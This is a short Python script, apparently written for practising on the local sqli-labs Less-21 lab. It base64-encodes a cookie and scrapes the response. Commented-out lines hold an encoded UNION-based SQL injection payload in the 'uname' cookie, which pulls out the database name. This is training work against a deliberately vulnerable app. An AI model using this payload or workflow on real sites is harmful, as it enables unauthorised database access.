#-*- coding: UTF-8 -*-#
#!/usr/bin/python3#

import requests
from bs4 import BeautifulSoup
import base64

#爬虫的父类

class get_basic_information:

    def __init__(self,url,cookie):
        self.url=url
        self.cookie=cookie
       
class WebSpider(get_basic_information):
    def __init__(self,url,cookie):
        get_basic_information.__init__(self,url,cookie)

    def login(self):
        print("[+]      正在登陆该页面。。。。")
        r=requests.get(self.url,cookies=self.cookie)
        try:
            r.raise_for_status
            r.encoding=r.apparent_encoding
            message=BeautifulSoup(r.text,"html.parser")
            return message
        except:
            return "[+]     因为某些原因，你无法登录到这个网站"

# cookie加密器
class CookieEncoder:
    def __init__(self,cookie):
        self.cookie=cookie

    def encoder(self):
        bytes_cookie=self.cookie.encode("utf-8")
        cookie=base64.b64encode(bytes_cookie)

        return str(cookie)


class FindTarget:
    def __init__(self,targetelement,cookie,url,special):
        self.targetelement=targetelement
        self.cookie=cookie
        self.url=url
        self.special=special

    def showDate(self):

        message=WebSpider(self.url,self.cookie).login().find_all(self.targetelement,self.special)
        for element_value in message:
            print("[+]      {}".format(element_value.text))


basic_cookie_value=input("[+]      请输入这个原始cookie:")
bs64_cookie=CookieEncoder(basic_cookie_value).encoder()
print(bs64_cookie)


"""
web=FindTarget("font",
                {"uname":" YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgbGltaXQgMSwxIw="},
                "http://127.0.0.1/sqllab/Less-21/",
                {"color":"grey"})
web.showDate()
"""         







# site=WebSpider("http://127.0.0.1/sqllab/Less-21/",{"uname":" YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgbGltaXQgMSwxIw="})
# print(site.login())
